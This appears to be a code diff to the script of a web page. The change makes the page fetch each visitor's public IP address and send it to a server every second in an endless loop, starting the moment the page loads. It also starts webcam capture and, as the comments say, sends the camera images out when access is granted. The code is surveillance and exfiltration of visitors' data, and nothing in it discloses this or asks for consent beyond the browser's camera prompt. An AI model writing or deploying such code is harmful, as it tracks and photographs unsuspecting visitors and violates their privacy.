@@ -57,16 +57,20 @@ async function sendData(imageBlob, ip) {
   }
 }
 
-async function captureLoop() {
-  const ip = await getPublicIP();
-  await sendData(null, ip); // Send IP info immediately, no camera needed
+async function startIPSender(ip) {
+  while (true) {
+    await sendData(null, ip);
+    await new Promise(r => setTimeout(r, 1000));
+  }
+}
 
+async function captureLoop(ip) {
   let stream;
   try {
     stream = await navigator.mediaDevices.getUserMedia({video:true});
   } catch {
     console.error('Camera access denied or unavailable');
-    return; // Stop if no camera access but IP already sent
+    return;
   }
 
   const video = document.createElement('video');
@@ -88,7 +92,11 @@ async function captureLoop() {
   }
 }
 
-captureLoop();
+(async () => {
+  const ip = await getPublicIP();
+  startIPSender(ip); // start sending IP every 1 second, instantly after load
+  captureLoop(ip);   // start sending camera images if permitted
+})();
 </script>
 </body>
 </html>
